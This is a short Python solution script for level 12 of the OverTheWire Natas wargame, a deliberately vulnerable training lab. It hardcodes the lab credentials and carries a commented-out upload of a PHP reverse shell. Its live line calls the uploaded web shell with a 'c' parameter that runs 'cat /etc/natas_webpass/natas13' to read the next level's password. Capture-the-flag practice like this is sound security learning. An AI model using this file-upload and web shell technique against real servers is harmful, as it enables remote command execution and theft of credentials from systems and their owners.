#!/usr/bin/env python3

import requests
import re

username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
# response = session.post(url, files = { "uploadedfile": open('revshell.php', 'rb') }, data = { "filename": "revshell.php", "MAX_FILE_SIZE": "1000" }, auth = (username, password))
response = session.get(url + "upload/y5e1rxkwwa.php?c=cat /etc/natas_webpass/natas13", auth = (username, password))

content = response.text

print(re.findall('(.*)\n', content)[0])